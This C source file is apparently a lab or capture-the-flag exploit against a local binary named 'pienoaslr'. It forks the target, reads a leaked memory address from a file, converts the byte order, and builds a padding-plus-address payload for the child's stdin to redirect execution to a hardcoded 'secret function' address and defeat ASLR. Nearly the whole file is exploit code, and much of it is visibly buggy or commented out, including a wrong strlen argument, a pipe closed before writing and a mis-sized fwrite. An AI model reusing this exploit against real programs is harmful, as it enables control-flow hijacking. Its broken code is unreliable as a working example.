#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/types.h>
#include <stdint.h>

char *strrev(char *str)
{
	char *p1, *p2;
	if (! str || ! *str) return str;
	for (p1 = str, p2 = str + strlen(str-1); p2 > p1; ++p1, --p2) {
		*p1 ^= *p2;
		*p2 ^= *p1;
		*p1 ^= *p2;
	}
	return str;
}

int main () {
	int leakMeStringAddress   = 0x56558424;
	int secretFunctionAddress = 0x565561fd;
	char exploit[128];
	char padding[128] = "AAAABBBBCCCCDDDDEEEEFFFFGGGG";

	int fd[2];
	pid_t pid;
	pipe(fd);
	pid = fork();
	if (pid == 0) {
		close(fd[1]);
		dup2(fd[0],0);
		execv("./pienoaslr", NULL);
	}
	//printf("[*] Generating leaked address and storing it into leak.txt\n");
	sleep(2);

	//printf("[*] Reading leaked address... \n");
	sleep(2);

	char readData[64];
	FILE *f = fopen("leak1.txt", "a+");
	
	if (NULL == f) {
		//printf("[*] Cannot find leak.txt\n");
	} else {
		//printf("[*] Found leak.txt!\n");
		char readData[64];
		while (fgets(readData, 64, f) != NULL) {
			//printf("[*] leak.txt contains: %s\n", readData);
			uint32_t addr;
			sscanf(readData, "%x", &addr);
			printf("[*} Leaked address (from readData) is %x\n",addr);
			//printf("[*] leakme string address is %x\n",leakMeStringAddress);
			//int aslrOffset = addr - leakMeStringAddress;
			//printf("[*] ASLR offset is %x\n",aslrOffset);
			//secretFunctionAddress = secretFunctionAddress + aslrOffset;
			//printf("[*] Crafting exploit payload...\n");
			//unsigned int one = addr & 0xff;
			//unsigned int two = (addr>>8) & 0xff;
			//unsigned int three = (addr>>16) & 0xff;
			//sprintf(exploit,"%s%c%c%c",padding,one,two,three);
			close(fd[0]);
			char arr[32];
			
			uint32_t swapped;
			swapped = ((addr >> 24) & 0xff) |
					((addr << 8) & 0xff0000) |
					((addr >> 8) & 0xff00) |
					((addr << 24) & 0xff000000);						
			
			int rc = sprintf(arr, "%d", swapped);
			for (int i = rc-2; i > 2; i-=2) {
				printf("%c%c %d\n",readData[i-1],readData[i],i);
			}			
		 	int i = 9;
			//write(fd[1],exploit,1024);	
			FILE *f = fopen("/tmp/output", "r+");
			
			const char hexstring[8], *pos = hexstring;
			sprintf(hexstring, "%x", swapped);
			unsigned char val[4];

			for (size_t count = 0; count < sizeof val/sizeof *val; count++) {

	sscanf(pos, "%2hhx", &val[count]);
	pos += 2;
}
			printf("0x");
			fprintf(f, "%s", padding);
			for (size_t count = 0; count < sizeof val/sizeof *val; count++) {
	printf("%02x ", val[count]);
}			
		fwrite(&val,1,sizeof(&val),f);
		sprintf(exploit, "%s%c", padding, &val);
		close(fd[0]);
		write(fd[1],exploit,1024);
		}
	}
	
	fclose(f);
	return 0;
	
}

